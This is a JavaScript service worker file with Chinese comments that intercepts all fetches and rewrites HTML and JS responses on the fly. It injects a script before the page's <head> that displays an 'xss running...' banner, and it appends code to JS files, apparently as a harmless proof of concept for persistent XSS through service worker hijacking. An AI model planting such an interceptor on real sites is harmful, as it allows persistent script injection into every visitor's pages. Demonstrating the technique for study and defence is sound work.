console.log('sw running...');

const TYPE_HTML = 1;
const TYPE_JS = 2;

const MIME_MAP = {
  'text/html': TYPE_HTML,
  'text/javascript': TYPE_JS,
  'application/javascript': TYPE_JS,
  'application/x-javascript': TYPE_JS,
};


// 插入 JS 中的代码
const INJECT_JS = `

// injected by Service Worker
console.log('js injected:', document.currentScript);
`


// 插入 HTML 中的代码
const INJECT_HTML = `\
  <!-- injected by Service Worker -->
  <script>
    if (document.readyState === 'complete') {
      runXss();
    } else {
      addEventListener('DOMContentLoaded', runXss);
    }
    function runXss() {
      var div = document.createElement('div');
      div.innerHTML = 'xss running...';
      div.style.cssText = 'position:fixed; top:0; right:0; color:red; background:#000; font-size:40px; line-height:40px; z-index:999999';
      document.body.appendChild(div);
    }
  </script>
  <!-- end -->
  $&`


async function proxyAndInjectHtml(req) {
  let res = await fetch(req.url /*, {...} */);

  // 只劫持 HTML 和 JS 资源
  let ct = res.headers.get('Content-Type') || '';
  let mime = ct.split(/;\s*/)[0];
  let type = MIME_MAP[mime.toLowerCase()];
  if (!type) {
    return res;
  }

  // 现实中最好使用 Stream API，可保持内容渐进展示
  let txt = await res.text();

  switch (type) {
  case TYPE_HTML:
    // 注入在 <head> 之前
    txt = txt.replace('<head', INJECT_HTML);
    break;

  case TYPE_JS:
    // 附加在 JS 末尾
    txt = txt + INJECT_JS;
    break;
  }

  // 返回新的响应
  return new Response(txt, {
    status: res.status,
    statusText: res.statusText,
    headers: res.headers,
  });
}

self.onfetch = function(e) {
  console.log('onfetch:', e.request);
  let p = proxyAndInjectHtml(e.request);
  e.respondWith(p);
};

self.onactivate = function(e) {
  console.log('onactivate');
  e.waitUntil(clients.claim());
};

self.oninstall = function(e) {
  skipWaiting();
};
